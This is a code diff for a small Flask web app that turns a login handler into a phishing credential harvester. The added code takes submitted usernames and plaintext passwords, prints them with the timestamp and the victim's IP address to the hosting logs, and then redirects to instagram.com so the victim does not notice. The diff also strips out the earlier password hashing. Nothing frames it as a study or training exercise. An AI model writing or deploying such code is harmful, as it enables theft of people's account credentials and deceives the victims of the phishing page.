@@ -1,11 +1,11 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect
 import os
-from werkzeug.security import generate_password_hash
+from datetime import datetime
 
 app = Flask(__name__, template_folder='templates')
 
-# Safe default for development
-app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-key-123')
+# Environment variables (set these in Render dashboard)
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-fallback-key')
 
 @app.route('/')
 def index():
@@ -13,29 +13,19 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    try:
-        username = request.form.get('username', '').strip()
-        password = request.form.get('password', '').strip()
-        
-        if not username or not password:
-            return "Username and password required", 400
-            
-        hashed_pw = generate_password_hash(password)
-        print(f"Login attempt: {username}")  # View in Render logs
-        
-        # Option 1: In-memory storage (recommended)
-        global last_login
-        last_login = {'username': username, 'hashed_pw': hashed_pw}
-        
-        # Option 2: Temporary file (ephemeral on Render)
-        with open('/tmp/credentials.txt', 'a') as f:
-            f.write(f"{username}:{hashed_pw}\n")
-            
-        return "Login processed successfully!"
-        
-    except Exception as e:
-        print(f"ERROR: {str(e)}")  # Debug in logs
-        return f"Server error: {str(e)}", 500
+    username = request.form.get('username', '').strip()
+    password = request.form.get('password', '').strip()
+    
+    # Log the credentials securely in Render's console
+    print(f"\n⚠️ NEW LOGIN ATTEMPT ⚠️\n"
+          f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+          f"Username: {username}\n"
+          f"Password: {password}\n"
+          f"IP Address: {request.remote_addr}\n"
+          "--------------------------")
+    
+    # Redirect to Instagram (user won't see their info)
+    return redirect("https://www.instagram.com")
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
